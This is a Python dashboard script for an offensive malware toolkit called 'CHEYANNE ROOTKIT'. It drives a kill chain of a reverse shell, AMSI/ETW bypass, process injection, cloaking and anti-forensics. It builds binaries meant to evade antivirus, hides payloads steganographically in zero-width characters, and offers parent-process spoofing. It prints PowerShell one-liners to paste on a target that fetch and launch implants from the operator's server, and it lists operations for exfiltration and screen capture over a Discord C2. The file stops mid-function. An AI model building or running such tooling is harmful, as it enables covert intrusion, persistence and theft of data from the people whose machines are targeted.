"""
CHEYANNE ROOTKIT — Terminal Dashboard
ANSI colors matched to rainfantry.github.io palette.
"""
import os
import sys
import glob
import subprocess

if sys.platform == "win32":
    os.system("")  # enable ANSI on Windows
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

ROOT = os.path.dirname(os.path.abspath(__file__))

# rainfantry.github.io palette → ANSI true color
GREEN  = "\033[38;2;0;255;65m"
GREEN2 = "\033[38;2;0;204;51m"
GREEN3 = "\033[38;2;0;153;34m"
AMBER  = "\033[38;2;255;176;0m"
RED    = "\033[38;2;255;68;68m"
BLUE   = "\033[38;2;68;136;255m"
PINK   = "\033[38;2;255;45;138m"
DIM    = "\033[38;2;85;85;85m"
MUTED  = "\033[38;2;136;136;136m"
TEXT   = "\033[38;2;204;204;204m"
WHITE  = "\033[38;2;255;255;255m"
BOLD   = "\033[1m"
RST    = "\033[0m"

CHEYANNE_LOGO = f"""
{GREEN}{BOLD}
  ██████╗██╗  ██╗███████╗██╗   ██╗ █████╗ ███╗   ██╗███╗   ██╗███████╗
 ██╔════╝██║  ██║██╔════╝╚██╗ ██╔╝██╔══██╗████╗  ██║████╗  ██║██╔════╝
 ██║     ███████║█████╗   ╚████╔╝ ███████║██╔██╗ ██║██╔██╗ ██║█████╗
 ██║     ██╔══██║██╔══╝    ╚██╔╝  ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝
 ╚██████╗██║  ██║███████╗   ██║   ██║  ██║██║ ╚████║██║ ╚████║███████╗
  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝{RST}
"""

HELMET = f"""{DIM}           .          .
        .  |\\        /|  .
           | \\______/ |
      .    |  ______  |    .
           | |{RED}  ..  {DIM}| |
           | |{RED}  ::  {DIM}| |
           | |{RED} /__\\ {DIM}| |
           |  \\{MUTED}____/{DIM}  |
            \\________/{RST}"""

KILL_CHAIN = [
    ("0", "C2 REVERSE SHELL",    "ALPHA",   "shell/vader_shell.exe",           RED),
    ("1", "AMSI BYPASS",         "DELTA",   "amsi/amsi_hwbp.exe",             GREEN),
    ("2", "ETW BYPASS",          "FOXTROT", "etw/etw_hwbp.exe",               GREEN),
    ("3", "PRIVILEGE ESCALATION","GOLF",    "sideload/svc_replace.exe",        AMBER),
    ("4", "PROCESS INJECTION",   "HOTEL",   "injection/vader_inject.exe",      BLUE),
    ("5", "HTTP STAGER",         "INDIA",   "stagers/vader_stager.exe",        PINK),
    ("6", "ANTI-FORENSICS",      "JULIET",  "forensics/vader_clean.exe",       PINK),
    ("7", "CLOAK",               "KILO",    "cloak/bin/cloak.dll",             WHITE),
    ("M", "AUTO-MUTATION",       "MUTATE",  "mutate.py",                       AMBER),
]

GHOST_DIR = os.path.join(os.path.dirname(ROOT), "ghost-encoder")
CYAN   = "\033[38;2;0;229;255m"

TOOLS = [
    ("D", "DARK ROOM",   "Combined AMSI+ETW blind",         "dark_room/dark_room.exe"),
    ("I", "INJECTOR DLL","HWBP propagation payload",         "injection/vader_inject.dll"),
    ("C", "CLOAK LOADER","System-wide concealment",          "cloak/bin/cloak_loader.exe"),
    ("V", "DROPPER",     "Single-click full kill chain",     "cloak/bin/vader_dropper.exe"),
    ("G", "GHOST ENCODE","Steganographic payload encoder",   os.path.join(GHOST_DIR, "ghost_encode.py")),
    ("R", "RECON",       "Defender scanner",                 "recon/vader_recon.ps1"),
    ("P", "DEPLOY",      "Build + scan + deploy",            "deploy.py"),
]

try:
    from cheyanne_ops import (op_sessions, op_screenshot, op_browse,
                               op_exfil, op_upload, op_recon)
    HAS_OPS = True
except ImportError:
    HAS_OPS = False


def check_built(rel_path):
    return os.path.exists(os.path.join(ROOT, rel_path))


def get_xor_key(source_path, key_name="XOR_KEY"):
    import re
    path = os.path.join(ROOT, source_path)
    if not os.path.exists(path):
        return None
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            m = re.match(rf'\s*#define\s+{re.escape(key_name)}\s+(0x[0-9A-Fa-f]{{1,2}})', line)
            if m:
                return m.group(1)
    return None


def get_defender_version():
    for p in sorted(glob.glob(r"C:\ProgramData\Microsoft\Windows Defender\Platform\*"), reverse=True):
        return os.path.basename(p)
    return "unknown"


def hline(char="─", width=62, color=DIM):
    return f"  {color}{char * width}{RST}"


def render():
    os.system("cls" if sys.platform == "win32" else "clear")

    print(CHEYANNE_LOGO)
    print(f"  {DIM}{'─' * 62}{RST}")
    print(f"  {MUTED}22DIV{DIM} // {TEXT}george wu{DIM} // {GREEN2}rainfantry.github.io{RST}")
    print(f"  {DIM}Offensive Security Research Platform{RST}")
    print(f"  {DIM}{'─' * 62}{RST}")

    # helmet + info side by side
    helmet_lines = HELMET.strip().split("\n")
    info_lines = [
        f"{AMBER}CALLSIGN{DIM}:{RST}  CHEYANNE",
        f"{AMBER}TARGET{DIM}:{RST}    Own hardware only",
        f"{AMBER}DEFENDER{DIM}:{RST}  {get_defender_version()}",
        f"{AMBER}STATUS{DIM}:{RST}    {GREEN}OPERATIONAL{RST}",
        f"{AMBER}MSRC{DIM}:{RST}      VULN-195458",
        f"{AMBER}FINDING{DIM}:{RST}   {RED}HWBP Blind Spot{RST}",
        f"{AMBER}VERDICT{DIM}:{RST}   {RED}Won't Fix{RST}",
        "",
        f"  {DIM}\"The hunt never ends.\"{RST}",
    ]

    max_lines = max(len(helmet_lines), len(info_lines))
    print()
    for i in range(max_lines):
        left = helmet_lines[i] if i < len(helmet_lines) else ""
        right = info_lines[i] if i < len(info_lines) else ""
        # pad left column (strip ANSI for width calc)
        import re
        visible = re.sub(r'\033\[[0-9;]*m', '', left)
        pad = 36 - len(visible)
        print(f"  {left}{' ' * max(pad, 1)}{right}")

    # kill chain
    print()
    print(hline("═"))
    print(f"  {GREEN}{BOLD}  KILL CHAIN{RST}")
    print(hline("═"))
    print()
    print(f"  {DIM}  PH  {'COMPONENT':<24s} {'CODENAME':<10s} {'STATUS':<10s} {'KEY':<8s}{RST}")
    print(f"  {DIM}  {'─' * 58}{RST}")

    key_map = {
        "shell/vader_shell.exe":      ("shell/vader_shell_annotated.c", "XOR_KEY"),
        "amsi/amsi_hwbp.exe":         None,
        "etw/etw_hwbp.exe":           None,
        "sideload/svc_replace.exe":   None,
        "injection/vader_inject.exe": ("injection/vader_inject_annotated.c", "XOR_KEY"),
        "stagers/vader_stager.exe":   None,
        "forensics/vader_clean.exe":  None,
        "cloak/bin/cloak.dll":        None,
        "mutate.py":                  None,
    }

    for phase, name, codename, binary, color in KILL_CHAIN:
        built = check_built(binary)
        status = f"{GREEN}BUILT{RST}" if built else f"{RED}NOT BUILT{RST}"

        key_info = key_map.get(binary)
        if key_info:
            k = get_xor_key(key_info[0], key_info[1])
            key_str = f"{AMBER}{k}{RST}" if k else f"{DIM}---{RST}"
        else:
            key_str = f"{DIM}---{RST}"

        print(f"  {color}  [{phase}]  {name:<24s}{RST} {MUTED}{codename:<10s}{RST} {status:<20s} {key_str}")

    # tools
    print()
    print(hline("═"))
    print(f"  {BLUE}{BOLD}  ARSENAL{RST}")
    print(hline("═"))
    print()
    for key, name, desc, path in TOOLS:
        built = check_built(path)
        dot = f"{GREEN}●{RST}" if built else f"{RED}○{RST}"
        print(f"  {dot}  {BLUE}[{key}]{RST}  {WHITE}{name:<14s}{RST} {DIM}{desc:<30s}{RST}")

    # ── PHASE 1: BUILD ──
    print()
    print(hline("═"))
    print(f"  {PINK}{BOLD}  PHASE 1 — BUILD{RST}")
    print(hline("─"))
    build_ops = [
        ("F", "Fresh Build",    "Mutate + auto-IP + compile + scan", PINK),
        ("X", "FUD Build",      "Metamorph + mutate + compile — evades AV/EDR", RED),
        ("Z", "FUD Auto",       "Automated loop until Kaspersky CLEAN (ghost mode)", RED),
        ("1", "Compile Only",   "Build without mutation",            AMBER),
        ("4", "Mutate Keys",    "Rotate XOR keys + recompile",       AMBER),
        ("6", "Key Status",     "Show current XOR mutation state",   AMBER),
        ("2", "Scan All",       "Kaspersky + Defender — all binaries", RED),
    ]
    for key, name, desc, color in build_ops:
        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<18s}{RST} {DIM}{desc}{RST}")

    # ── PHASE 2: STEALTH ──
    print()
    print(hline("═"))
    print(f"  {GREEN}{BOLD}  PHASE 2 — STEALTH{RST}")
    print(hline("─"))
    stealth_ops = [
        ("3", "Dark Room",      "AMSI + ETW bypass test",            GREEN),
        ("7", "Build Cloak",    "Compile cloak.dll + loader",        WHITE),
        ("8", "Test Cloak",     "Verify process/port hiding",        WHITE),
        ("9", "Activate Cloak", "System-wide concealment ON",        RED),
    ]
    for key, name, desc, color in stealth_ops:
        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<18s}{RST} {DIM}{desc}{RST}")

    # ── PHASE 3: DEPLOY ──
    print()
    print(hline("═"))
    print(f"  {RED}{BOLD}  PHASE 3 — DEPLOY{RST}")
    print(hline("─"))
    deploy_ops = [
        ("P", "Phase 0",        "Pre-op: KAV pause + file server + C2", RED),
        ("B", "Build Implant",  "Sync token + rebuild + serve",      CYAN),
        ("A", "Auto Deploy",    "Compile + ship implant to target",  RED),
        ("R", "TCP Reconnect",  "Ghost re-deliver via Discord beacon (KAV-safe)", AMBER),
    ]
    for key, name, desc, color in deploy_ops:
        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<18s}{RST} {DIM}{desc}{RST}")

    # ── PHASE 4: OPERATE ──
    print()
    print(hline("═"))
    print(f"  {CYAN}{BOLD}  PHASE 4 — OPERATE{RST}  {DIM}(Discord implant commands){RST}")
    print(hline("─"))
    ops_color = CYAN if HAS_OPS else DIM
    operate_ops = [
        ("S", "Sessions",       "List active targets",               ops_color),
        ("T", "Screenshot",     "Capture + download target screen",  ops_color),
        ("L", "Browse Files",   "List target filesystem",            ops_color),
        ("E", "Exfil File",     "Pull file from target → local",    ops_color),
        ("U", "Upload File",    "Push file to target",               ops_color),
        ("N", "Recon",          "Full target enumeration",           ops_color),
    ]
    for key, name, desc, color in operate_ops:
        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<18s}{RST} {DIM}{desc}{RST}")
    if not HAS_OPS:
        print(f"  {RED}  [!] cheyanne_ops.py not found — OPERATE disabled{RST}")

    # ── TOOLKIT ──
    print()
    print(hline("═"))
    print(f"  {BLUE}{BOLD}  TOOLKIT{RST}")
    print(hline("─"))
    toolkit_ops = [
        ("G", "Ghost Encode",   "Steg payload + ghost_loader.exe",  CYAN),
        ("D", "C2 Shell",       "TCP + Discord dual-channel C2",     GREEN),
        ("H", "HANDLER",        "AI operator — chat + tools",       PINK),
        ("5", "Pentest Chain",  "Full automated kill chain",         RED),
        ("W", "Web Dashboard",  "Browser C2 UI",                     BLUE),
        ("I", "Image Convert",  "BMP/PNG/JPG auto-convert",         WHITE),
        ("0", "Exit",           "",                                  DIM),
    ]
    for key, name, desc, color in toolkit_ops:
        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<18s}{RST} {DIM}{desc}{RST}")

    print()
    print(hline())
    cloak_ready = check_built("cloak/bin/cloak.dll") and check_built("cloak/bin/cloak_loader.exe")
    cloak_str = f"{WHITE}READY{DIM}" if cloak_ready else f"{RED}NOT BUILT{DIM}"
    ghost_ready = os.path.exists(os.path.join(GHOST_DIR, "ghost_encode.py"))
    ghost_str = f"{CYAN}LINKED{DIM}" if ghost_ready else f"{RED}NOT FOUND{DIM}"
    print(f"  {DIM}  Defender: {GREEN}ZERO{DIM} │ Cloak: {cloak_str} │ Ghost: {ghost_str}{RST}")
    print(hline())
    print()


def convert_image():
    """Auto-detect and convert image formats (BMP↔PNG↔JPG)."""
    print(f"\n  {WHITE}{BOLD}  IMAGE CONVERTER{RST}")
    print(f"  {DIM}  Drag file or paste path. Output goes next to source.{RST}\n")
    src = input(f"  {WHITE}  File: {RST}").strip().strip('"').strip("'")
    if not src or not os.path.isfile(src):
        print(f"  {RED}  [!] File not found: {src}{RST}")
        return

    ext = os.path.splitext(src)[1].lower()
    base = os.path.splitext(src)[0]

    fmt_map = {".bmp": ".png", ".png": ".jpg", ".jpg": ".png", ".jpeg": ".png"}
    default_out = fmt_map.get(ext, ".png")

    print(f"  {DIM}  Detected: {ext.upper()} → default output: {default_out.upper()}{RST}")
    out_choice = input(f"  {WHITE}  Output format [png/jpg/bmp] (enter = {default_out[1:]}): {RST}").strip().lower()
    if not out_choice:
        out_ext = default_out
    elif out_choice in ("png", "jpg", "jpeg", "bmp"):
        out_ext = f".{out_choice}"
    else:
        print(f"  {RED}  [!] Unknown format: {out_choice}{RST}")
        return

    dst = base + out_ext
    if os.path.exists(dst):
        dst = base + f"_converted{out_ext}"

    try:
        cmd = (
            f'powershell -c "Add-Type -AssemblyName System.Drawing; '
            f"$img = [System.Drawing.Image]::FromFile('{src}'); "
        )
        if out_ext == ".png":
            cmd += f"$img.Save('{dst}', [System.Drawing.Imaging.ImageFormat]::Png); "
        elif out_ext in (".jpg", ".jpeg"):
            cmd += f"$img.Save('{dst}', [System.Drawing.Imaging.ImageFormat]::Jpeg); "
        elif out_ext == ".bmp":
            cmd += f"$img.Save('{dst}', [System.Drawing.Imaging.ImageFormat]::Bmp); "
        cmd += '$img.Dispose()"'

        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0 and os.path.isfile(dst):
            src_size = os.path.getsize(src)
            dst_size = os.path.getsize(dst)
            print(f"  {GREEN}  [+] Converted: {os.path.basename(dst)}{RST}")
            print(f"  {DIM}  {src_size:,} bytes → {dst_size:,} bytes{RST}")
        else:
            print(f"  {RED}  [!] Conversion failed: {result.stderr.strip()}{RST}")
    except Exception as e:
        print(f"  {RED}  [!] Error: {e}{RST}")


def show_ghost_demo(ghost_file):
    """Show the ??????? visualization of a ghost file."""
    try:
        with open(ghost_file, 'r', encoding='utf-8') as f:
            content = f.read()
        start = content.index("@'") + 2
        end = content.index("'@")
        payload = content[start:end].strip()
        vis = payload.replace(payload[0] if payload else '', '?')
        lines = [vis[i:i+72] for i in range(0, min(len(vis), 360), 72)]
        print(f"\n  {CYAN}{'═' * 62}{RST}")
        print(f"  {CYAN}{BOLD}  GHOST PAYLOAD VISUALIZATION{RST}")
        print(f"  {CYAN}{'═' * 62}{RST}")
        print(f"  {DIM}  PS> cat {os.path.basename(ghost_file)}{RST}")
        print()
        for line in lines:
            print(f"  {AMBER}  {'?' * min(len(line), 72)}{RST}")
        if len(vis) > 360:
            print(f"  {DIM}  ... {len(payload):,} invisible characters total ...{RST}")
        print()
        print(f"  {DIM}  Invisible chars: {len(payload):,}{RST}")
        print(f"  {DIM}  File size:       {os.path.getsize(ghost_file):,} bytes{RST}")
        print(f"  {GREEN}  Defender:        CLEAN{RST}")
        print(f"  {CYAN}{'═' * 62}{RST}")
    except Exception as e:
        print(f"  {RED}[!] Cannot visualize: {e}{RST}")


def run_ghost():
    """Ghost encoding menu."""
    ghost_script = os.path.join(GHOST_DIR, "ghost_encode.py")
    if not os.path.exists(ghost_script):
        print(f"\n  {RED}[!] Ghost encoder not found at: {GHOST_DIR}{RST}")
        print(f"  {DIM}    Clone: gh repo clone rainfantry/ghost-encoder{RST}")
        return

    print(f"\n  {CYAN}{'═' * 62}{RST}")
    print(f"  {CYAN}{BOLD}  GHOST ENCODER — Steganographic Payload Delivery{RST}")
    print(f"  {CYAN}{'═' * 62}{RST}")
    print()
    print(f"  {DIM}  Encodes payloads into 16 zero-width Unicode characters.{RST}")
    print(f"  {DIM}  Output file appears BLANK. PowerShell cat shows ???????.{RST}")
    print(f"  {DIM}  0 detections on VirusTotal. 0 detections on Defender.{RST}")
    print()
    print(f"  {CYAN}  [1]{RST} {WHITE}CHEYANNE Chain{RST}   {DIM}Persist(3x) + shell + screen capture{RST}")
    print(f"  {CYAN}  [2]{RST} {WHITE}Reverse Shell{RST}    {DIM}Shell only (lightweight){RST}")
    print(f"  {CYAN}  [3]{RST} {WHITE}Test Payload{RST}     {DIM}Harmless proof-of-concept{RST}")
    print(f"  {CYAN}  [4]{RST} {WHITE}Custom File{RST}      {DIM}Encode any .ps1 script{RST}")
    print(f"  {CYAN}  [5]{RST} {WHITE}Verify{RST}           {DIM}Decode + verify a ghost file{RST}")
    print(f"  {RED}  [6]{RST} {WHITE}Ghost Loader EXE{RST} {DIM}Steg PS1 baked into exe — 0 disk writes, 0 AV sigs{RST}")
    print(f"  {CYAN}  [0]{RST} {DIM}Back{RST}")
    print()

    choice = input(f"  {CYAN}GHOST >{RST} ").strip()

    if choice == "1":
        ip = prompt_ip("192.168.1.92")
        port = prompt_port()
        out = os.path.join(ROOT, "ghost_cheyanne.ps1")
        print(f"\n  {CYAN}[*] Generating CHEYANNE chain ghost payload...{RST}")
        env = os.environ.copy()
        env["PYTHONIOENCODING"] = "utf-8"
        subprocess.run([sys.executable, ghost_script, "--vader", ip, port,
                        "-o", out, "--deliver", "bat",
                        "--dark-room", os.path.join(ROOT, "dark_room", "dark_room.exe")],
                       cwd=GHOST_DIR, env=env)
        if os.path.exists(out):
            show_ghost_demo(out)
            print(f"\n  {GREEN}[+] Kill chain:{RST}")
            print(f"  {DIM}  1. dark_room.exe  → AMSI/ETW blind{RST}")
            print(f"  {DIM}  2. ghost_cheyanne.ps1 → invisible decode + execute{RST}")
            print(f"  {DIM}  3. Persistence × 3 (HKCU + Startup + Task){RST}")
            print(f"  {DIM}  4. Auto-reconnect shell → {ip}:{port}{RST}")
            print(f"  {DIM}  5. Screen capture via 'screen' command{RST}")

    elif choice == "2":
        ip = prompt_ip("192.168.1.92")
        port = prompt_port()
        out = os.path.join(ROOT, "ghost_shell.ps1")
        env = os.environ.copy()
        env["PYTHONIOENCODING"] = "utf-8"
        subprocess.run([sys.executable, ghost_script, "--shell", ip, port, "-o", out],
                       cwd=GHOST_DIR, env=env)
        if os.path.exists(out):
            show_ghost_demo(out)

    elif choice == "3":
        out = os.path.join(ROOT, "ghost_test.ps1")
        env = os.environ.copy()
        env["PYTHONIOENCODING"] = "utf-8"
        subprocess.run([sys.executable, ghost_script, "--test", "-o", out],
                       cwd=GHOST_DIR, env=env)
        if os.path.exists(out):
            show_ghost_demo(out)
            run_it = input(f"\n  {AMBER}Execute test payload? [y/N]:{RST} ").strip().lower()
            if run_it == 'y':
                subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                                "-File", out])

    elif choice == "4":
        path = input(f"  {AMBER}Path to .ps1:{RST} ").strip()
        if os.path.exists(path):
            out = os.path.join(ROOT, "ghost_custom.ps1")
            env = os.environ.copy()
            env["PYTHONIOENCODING"] = "utf-8"
            subprocess.run([sys.executable, ghost_script, path, "-o", out],
                           cwd=GHOST_DIR, env=env)
            if os.path.exists(out):
                show_ghost_demo(out)
        else:
            print(f"  {RED}[!] File not found: {path}{RST}")

    elif choice == "5":
        path = input(f"  {AMBER}Ghost .ps1 to verify:{RST} ").strip()
        if os.path.exists(path):
            env = os.environ.copy()
            env["PYTHONIOENCODING"] = "utf-8"
            subprocess.run([sys.executable, ghost_script, "--verify", path],
                           cwd=GHOST_DIR, env=env)
        else:
            print(f"  {RED}[!] File not found: {path}{RST}")

    elif choice == "6":
        ip   = prompt_ip()
        port = prompt_port()
        print(f"\n  {CYAN}Ghost Loader version:{RST}")
        print(f"  {DIM}  v2 — direct PS spawn (fast, may trip EDR parent-chain rule){RST}")
        print(f"  {DIM}  v3 — parent spoof: PS appears as explorer.exe child (beats EDR){RST}")
        ver_choice = input(f"  {AMBER}Version [2/3] (default: 3):{RST} ").strip()
        use_v3 = ver_choice != "2"
        builder = os.path.join(ROOT, "build_ghost_loader.py")
        cmd = [sys.executable, builder, ip, port]
        if use_v3:
            cmd.append("--v3")
        subprocess.run(cmd, cwd=ROOT)
        out = os.path.join(ROOT, "shell", "ghost_loader.exe")
        if os.path.exists(out):
            ver_label = "v3 [parent spoof]" if use_v3 else "v2 [direct]"
            print(f"\n  {GREEN}[+] Output: shell/ghost_loader.exe  ({ver_label}){RST}")
            print(f"  {DIM}  Copy to target. Run as any user.{RST}")
            scan_reminder()


def prompt_ip(default="192.168.1.92"):
    print(f"  {DIM}  IP advice:{RST}")
    print(f"  {DIM}    LAN  → use your laptop LAN IP (e.g. 192.168.1.92){RST}")
    print(f"  {DIM}    WAN (no port forward) → use ngrok:{RST}")
    print(f"  {DIM}         1. ngrok tcp 443                    ← run this first{RST}")
    print(f"  {DIM}         2. copy the Forwarding host:port    ← e.g. 0.tcp.ngrok.io:12345{RST}")
    print(f"  {DIM}         3. enter that host here, port when prompted{RST}")
    print(f"  {DIM}    WAN (port forward) → use DDNS hostname (e.g. vader22div.duckdns.org){RST}")
    print(f"  {DIM}         → LAN IP (192.168.x.x) is NOT routable from internet{RST}")
    return input(f"  {AMBER}C2 IP [{TEXT}{default}{AMBER}]:{RST} ").strip() or default


def prompt_port(default="4443"):
    print(f"  {DIM}  Port advice:{RST}")
    print(f"  {DIM}    443  → HTTPS      — best (never blocked, looks like browser traffic){RST}")
    print(f"  {DIM}    80   → HTTP       — good (almost never blocked){RST}")
    print(f"  {DIM}    8443 → HTTPS alt  — usually open{RST}")
    print(f"  {DIM}    4443 → custom     — fine on LAN, may flag on strict WAN{RST}")
    return input(f"  {AMBER}C2 PORT [{TEXT}{default}{AMBER}]:{RST} ").strip() or default


def detect_lan_ip():
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None


def fresh_build(mutate, deploy, fud=False):
    mode = "FUD BUILD — Metamorph + Mutate + Compile" if fud else "FRESH BUILD — Auto-Mutate + Auto-IP"
    print(f"\n  {PINK}{BOLD}═══ {mode} ═══{RST}\n")

    # Step 1: detect operator IP
    my_ip = detect_lan_ip()
    if my_ip:
        print(f"  {GREEN}[+] Operator IP: {my_ip}{RST}")
    else:
        print(f"  {RED}[!] Could not detect LAN IP{RST}")
        my_ip = input(f"  {AMBER}Enter C2 IP: {RST}").strip()

    metamorph = os.path.join(ROOT, "metamorph.py")

    if fud:
        # FUD pipeline: metamorph (source transforms) → mutate (XOR rotation) → compile → scan
        intensity = input(f"  {AMBER}Metamorph intensity [low/med/high, default=high]: {RST}").strip() or "high"
        print(f"\n  {PINK}[*] PHASE 1: Metamorphic transforms on shell (intensity={intensity})...{RST}\n")
        subprocess.run([sys.executable, metamorph, "--target", "shell",
                        "--intensity", intensity], cwd=ROOT)

        print(f"\n  {PINK}[*] PHASE 2: Rotating XOR keys across all components...{RST}\n")
        subprocess.run([sys.executable, mutate], cwd=ROOT)

        print(f"\n  {PINK}[*] PHASE 3: Compiling FUD shell with C2={my_ip}:4443{RST}\n")
        subprocess.run([sys.executable, deploy, "--compile-shell", my_ip, "4443"], cwd=ROOT)

        print(f"\n  {PINK}[*] PHASE 4: Scanning — verifying AV evasion...{RST}\n")
        subprocess.run([sys.executable, deploy, "--status"], cwd=ROOT)

        print(f"\n  {GREEN}{BOLD}═══ FUD BUILD COMPLETE ═══{RST}")
        print(f"  {WHITE}Source transformed. XOR keys rotated. Binary unique.{RST}")
        print(f"  {WHITE}Shell targets: {my_ip}:4443{RST}")
        print(f"  {DIM}Metamorphic + polymorphic — signature matching broken at source level.{RST}\n")
    else:
        # Standard fresh build: mutate XOR keys → compile → scan
        print(f"\n  {PINK}[*] PHASE 1: Mutating all components...{RST}\n")
        subprocess.run([sys.executable, mutate], cwd=ROOT)

        print(f"\n  {PINK}[*] PHASE 2: Building shell with C2={my_ip}:4443{RST}\n")
        subprocess.run([sys.executable, deploy, "--compile-shell", my_ip, "4443"], cwd=ROOT)

        print(f"\n  {PINK}[*] PHASE 3: Scanning all binaries...{RST}\n")
        subprocess.run([sys.executable, deploy, "--status"], cwd=ROOT)

        print(f"\n  {GREEN}{BOLD}═══ FRESH BUILD COMPLETE ═══{RST}")
        print(f"  {WHITE}Every binary is unique. Every hash is new.{RST}")
        print(f"  {WHITE}Shell targets: {my_ip}:4443{RST}")
        print(f"  {DIM}Defender signatures are worthless against polymorphic builds.{RST}\n")


def scan_reminder():
    print(f"\n  {RED}>>> ALWAYS run [2] Scan All after any build to verify AV evasion <<<{RST}")
    print(f"  {DIM}    python deploy.py --status  — checks all binaries including ghost_loader.exe{RST}\n")


def _phase0_launch():
    """Phase 0 pre-op: prompt KAV pause, start file server, launch C2."""
    import threading
    from http.server import HTTPServer, SimpleHTTPRequestHandler
    import functools

    print(f"\n  {RED}{BOLD}╔══ PHASE 0 — PRE-OP ══╗{RST}")
    print(f"  {AMBER}  1. Pause Kaspersky: right-click tray → Pause Protection → Until restart{RST}")
    print(f"  {DIM}     (skip if exclusions already set for Desktop/cheyanne){RST}")
    input(f"\n  {WHITE}  Press Enter when ready...{RST}")

    my_ip = detect_lan_ip() or "192.168.1.92"

    handler = functools.partial(SimpleHTTPRequestHandler, directory=ROOT)
    handler.log_message = lambda *a: None
    try:
        srv = HTTPServer(("0.0.0.0", 8890), handler)
        t = threading.Thread(target=srv.serve_forever, daemon=True)
        t.daemon = True
        t.start()
        print(f"\n  {GREEN}[OK]{RST} File server: http://{my_ip}:8890/")
        print(f"  {DIM}     Payload: http://{my_ip}:8890/shell/ghost_loader.exe{RST}")
    except OSError:
        print(f"  {AMBER}[!]{RST}  Port 8890 already in use — file server running elsewhere")

    print(f"  {GREEN}[OK]{RST} C2 listener: 0.0.0.0:4443")
    print()
    print(f"  {RED}{BOLD}  ┌─ COPY TO TARGET (PowerShell) ──────────────────────────────────────┐{RST}")
    print(f"  {WHITE}  $ip=\"{my_ip}\"{RST}")
    print(f"  {WHITE}  iwr \"http://{my_ip}:8890/shell/ghost_loader.exe\" -OutFile \"C:\\Users\\Public\\g.exe\"{RST}")
    print(f"  {WHITE}  iwr \"http://{my_ip}:8890/agent/svchost_update.exe\" -OutFile \"C:\\Users\\Public\\s.exe\"{RST}")
    print(f"  {WHITE}  Start-Process \"C:\\Users\\Public\\g.exe\"{RST}")
    print(f"  {WHITE}  Start-Process \"C:\\Users\\Public\\s.exe\"{RST}")
    print(f"  {RED}{BOLD}  └────────────────────────────────────────────────────────────────────┘{RST}")
    print()
    print(f"  {DIM}  One-liner: iwr \"http://{my_ip}:8890/shell/ghost_loader.exe\" -OutFile \"C:\\Users\\Public\\g.exe\"; iwr \"http://{my_ip}:8890/agent/svchost_update.exe\" -OutFile \"C:\\Users\\Public\\s.exe\"; Start-Process \"C:\\Users\\Public\\g.exe\"; Start-Process \"C:\\Users\\Public\\s.exe\"{RST}")
    print()

    c2_v2 = os.path.join(ROOT, "shell", "vader_c2_v2.py")
    # Launch in a new console window so input() in interact works properly
    subprocess.Popen(
        ["start", "cmd", "/K", sys.executable, c2_v2],
        cwd=ROOT, shell=True
    )


def _tcp_reconnect_via_discord():
    """Re-deliver ghost_loader_v3 via live Discord beacon to restore TCP shell."""
    import socket as _sock
    import http.server
    import threading
    import json
    import urllib.request

    print(f"\n  {AMBER}{BOLD}=== TCP RECONNECT VIA DISCORD ==={RST}")
    print(f"  {DIM}  vader_shell.exe is quarantined — using ghost_loader_v3 (KAV-clean){RST}\n")

    # 1. Check ghost_loader.exe exists
    ghost_exe = os.path.join(ROOT, "shell", "ghost_loader.exe")
    if not os.path.exists(ghost_exe):
        print(f"  {RED}[!] ghost_loader.exe not found — build it first with [G]{RST}")
        return

    # 2. Get operator LAN IP
    try:
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        my_ip = s.getsockname()[0]
        s.close()
    except Exception:
        my_ip = "192.168.1.92"
    print(f"  {GREEN}[*] Operator IP: {my_ip}{RST}")

    # 3. Check ngrok
    ngrok_addr = None
    try:
        with urllib.request.urlopen("http://localhost:4040/api/tunnels", timeout=3) as r:
            data = json.loads(r.read())
            for t in data.get("tunnels", []):
                if "tcp" in t.get("proto", ""):
                    ngrok_addr = t["public_url"].replace("tcp://", "")
                    break
    except Exception:
        pass
    if ngrok_addr:
        print(f"  {GREEN}[*] ngrok active: {ngrok_addr}{RST}")
    else:
        print(f"  {AMBER}[!] ngrok not detected — using LAN delivery only{RST}")

    # 4. Start file server on 8890 serving ROOT
    import functools
    handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=ROOT)
    handler.log_message = lambda *a: None
    fs_started = False
    try:
        srv = http.server.HTTPServer(("0.0.0.0", 8890), handler)
        t = threading.Thread(target=srv.serve_forever, daemon=True)
        t.start()
        fs_started = True
        print(f"  {GREEN}[*] File server: http://{my_ip}:8890/shell/ghost_loader.exe{RST}")
    except OSError:
        print(f"  {AMBER}[!] Port 8890 already bound — assuming file server running{RST}")
        fs_started = True

    if not fs_started:
        print(f"  {RED}[!] File server failed to start{RST}")
        return

    # 5. Print the command to run in C2
    print(f"\n  {CYAN}Now open C2 ([D]) and run:{RST}")
    print(f"  {WHITE}  sessions{RST}        ← find Discord beacon session ID")
    print(f"  {WHITE}  deploy <id>{RST}      ← re-deliver ghost_loader_v3 to that session")
    print(f"\n  {DIM}  Or run directly via Discord C2:{RST}")
    cmd = (
        f'taskkill /F /IM ghost_loader.exe 2>nul & '
        f'powershell -c "'
        f'Invoke-WebRequest -Uri \'http://{my_ip}:8890/shell/ghost_loader.exe\' '
        f'-OutFile \'C:\\\\Users\\\\Public\\\\ghost_loader.exe\'; '
        f'Start-Process \'C:\\\\Users\\\\Public\\\\ghost_loader.exe\'"'
    )
    print(f"  {DIM}  cmd <id> {cmd[:80]}...{RST}")
    print()

    # 6. Launch C2
    c2_v2 = os.path.join(ROOT, "shell", "vader_c2_v2.py")
    launch = input(f"  {GREEN}Launch C2 now? [Y/n]: {RST}").strip().lower()
    if launch != "n":
